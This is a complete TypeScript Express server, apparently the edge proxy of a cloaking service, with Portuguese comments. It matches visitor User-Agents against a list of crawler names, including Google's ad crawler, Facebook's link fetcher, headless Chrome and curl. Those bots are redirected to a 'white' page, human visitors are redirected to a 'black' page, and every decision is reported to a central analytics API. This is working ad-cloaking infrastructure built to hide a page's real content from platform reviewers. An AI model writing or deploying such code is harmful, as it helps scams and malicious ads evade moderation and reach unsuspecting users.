import express from "express";
import axios from "axios";
import * as dotenv from "dotenv";

dotenv.config();

const app = express();
const PORT = Number(process.env.PORT || 8080);
const API_URL = process.env.API_URL || "https://api.cloakerguard.com.br";

// cache simples em memória para deduplicar hits
const recentHits = new Map<string, number>();
const DEDUP_WINDOW_MS = 5000;

// Funções de log seguras
function log(...args: any[]) {
  process.stdout.write(args.map(String).join(" ") + "\n");
}
function error(...args: any[]) {
  process.stderr.write(args.map(String).join(" ") + "\n");
}

function normalizeHost(raw = "") {
  return raw.split(",")[0].trim().toLowerCase().replace(/:\d+$/, "");
}

function normalizeTarget(url: string | undefined | null): string | null {
  if (!url) return null;
  let clean = url.trim().replace(/^\/+/, "");
  if (!/^https?:\/\//i.test(clean)) clean = `https://${clean}`;
  return clean;
}

// checa se deve ignorar o path
function isIgnoredPath(path: string): boolean {
  return (
    path.startsWith("/favicon") ||
    path.startsWith("/robots.txt") ||
    path.startsWith("/apple-touch-icon") ||
    path.startsWith("/static/") ||
    path.endsWith(".png") ||
    path.endsWith(".jpg") ||
    path.endsWith(".jpeg") ||
    path.endsWith(".gif") ||
    path.endsWith(".css") ||
    path.endsWith(".js")
  );
}

app.use(async (req: any, res) => {
  try {
    const host = normalizeHost(
      req.headers["x-forwarded-host"] || req.headers.host || ""
    );
    if (!host) return res.status(400).send("Host header required");

    const path = req.url || "/";
    const ip =
      (req.headers["x-forwarded-for"] as string)?.split(",")[0] ||
      req.socket.remoteAddress ||
      "";

    const ua = req.headers["user-agent"]?.toLowerCase() || "";
    log("=== Nova requisição recebida ===");
    log("[EDGE] Host:", host, "Path:", path, "IP:", ip, "UA:", ua);

    // ignora paths que não são página principal
    if (isIgnoredPath(path)) {
      log("[EDGE] Ignorado path:", path);
      return res.status(204).end();
    }

    // chama API central
    const resp = await axios.get(`${API_URL}/domains/resolve`, {
      params: { host },
      timeout: 5000,
    });

    const data = resp.data;

    // detecção de bot
    const isBot =
      /bot|crawl|slurp|spider|mediapartners|facebookexternalhit|headlesschrome|curl/i.test(
        ua
      );

    let target: string | null = null;

    if (isBot) {
      target = normalizeTarget(data.whiteOrigin);
      log(
        `[EDGE] Decisão: BOT detectado → encaminhando para WHITE URL: ${target}`
      );
    } else {
      target = normalizeTarget(data.blackOrigin);
      log(
        `[EDGE] Decisão: HUMANO detectado → encaminhando para BLACK URL: ${target}`
      );
    }

    // fallback se nenhum configurado
    if (!target) {
      target = normalizeTarget(data.blackOrigin || data.whiteOrigin);
      log(`[EDGE] Aviso: fallback acionado → target final: ${target}`);
    }

    if (!target) {
      error("[EDGE] Nenhum destino configurado para host:", host);
      return res.status(500).send("Nenhum destino configurado");
    }

    // deduplicação de hits
    const key = `${host}:${ip}`;
    const now = Date.now();
    const last = recentHits.get(key);
    if (!last || now - last > DEDUP_WINDOW_MS) {
      recentHits.set(key, now);

      try {
        await axios.post(`${API_URL}/analytics/hit`, {
          userId: data.userId,
          domainId: data.id,
          domainName: data.host,
          decision: isBot ? "filtered" : "passed",
          reason: isBot ? "bot" : "unknown",
          ip,
          ua,
          referer: req.headers["referer"] || req.headers["referrer"] || "",
        });
        log("[EDGE] Hit registrado:", {
          host,
          ip,
          decision: isBot ? "filtered" : "passed",
          target,
        });
      } catch (err: any) {
        error("[EDGE] Falha ao registrar hit:", err.message);
      }
    } else {
      log("[EDGE] Hit duplicado ignorado para", key);
    }

    log(`[EDGE] Redirecionando ${host} -> ${target}`);
    res.setHeader("Cache-Control", "no-store");
    return res.redirect(302, target);
  } catch (err: any) {
    error("[EDGE] Erro:", err.message);
    return res.status(500).send("Internal proxy error");
  }
});

app.get("/__edge-check", (req, res) => {
  res.status(200).send("ok");
});

app.listen(PORT, "0.0.0.0", () => {
  console.log(`🌍 Edge rodando na porta ${PORT}`);
});
